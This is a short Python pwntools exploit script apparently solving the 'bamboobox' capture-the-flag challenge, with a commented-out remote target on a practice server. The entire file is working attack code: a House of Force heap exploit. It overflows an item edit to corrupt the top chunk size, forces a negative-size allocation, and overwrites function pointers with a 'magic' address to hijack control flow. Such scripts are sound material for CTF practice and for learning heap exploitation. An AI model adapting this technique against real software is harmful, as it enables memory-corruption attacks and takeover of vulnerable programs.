from pwn import *
#r = remote('node3.buuoj.cn',28044)
r = process('./bamboobox')
elf = ELF('./bamboobox')

magic = 0x400d49

def show():
	r.sendlineafter('Your choice:','1')

def add(size,name):
	r.sendlineafter('Your choice:','2')
	r.sendlineafter('name:',str(size))
	r.sendlineafter('item:',name)

def edit(index,size,name):
	r.sendlineafter('Your choice:','3')
	r.sendlineafter('item:',str(index))
	r.sendlineafter('name:',str(size))
	r.sendafter('item:',name)

def free(index):
	r.sendlineafter('Your choice:','4')
	r.sendlineafter('item:',str(index))


add(0x60,'fuck')
edit(0,0x70,'a'*0x60+p64(0)+'\xff'*8)
add(-0x70-0x20-0x10,'aaaa')
add(0x20,p64(magic)*2)
r.interactive()